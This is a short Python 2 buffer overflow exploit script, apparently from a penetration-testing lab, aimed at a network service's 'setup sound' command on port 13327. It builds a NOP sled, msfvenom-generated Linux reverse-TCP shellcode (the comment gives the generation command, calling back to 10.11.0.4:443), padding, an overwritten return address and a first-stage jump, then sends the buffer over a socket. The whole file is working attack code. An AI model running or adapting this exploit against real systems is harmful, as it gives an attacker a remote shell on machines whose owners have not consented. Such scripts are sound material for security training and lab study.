#!/usr/bin/python
import socket

host = "192.168.199.44"
nop_sled = "\x90" * 8 # NOP Sled

eip = "\x96\x45\x13\x08"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b ="\x00\x20" -f py -v shellcode

shellcode =  b""
shellcode += b"\xbe\xb1\x92\x12\x2c\xdb\xd7\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x12\x31\x70\x12\x83\xe8\xfc"
shellcode += b"\x03\xc1\x9c\xf0\xd9\x10\x7a\x03\xc2\x01\x3f"
shellcode += b"\xbf\x6f\xa7\x36\xde\xc0\xc1\x85\xa1\xb2\x54"
shellcode += b"\xa6\x9d\x79\xe6\x8f\x98\x78\x8e\xcf\xf3\x0c"
shellcode += b"\x89\xb8\x01\xf3\x14\x82\x8f\x12\xa6\x92\xdf"
shellcode += b"\x85\x95\xe9\xe3\xac\xf8\xc3\x64\xfc\x92\xb5"
shellcode += b"\x4b\x72\x0a\x22\xbb\x5b\xa8\xdb\x4a\x40\x7e"
shellcode += b"\x4f\xc4\x66\xce\x64\x1b\xe8"

padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
# buffer = "\x11(setup sound " + padding + badchars + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload sent!"
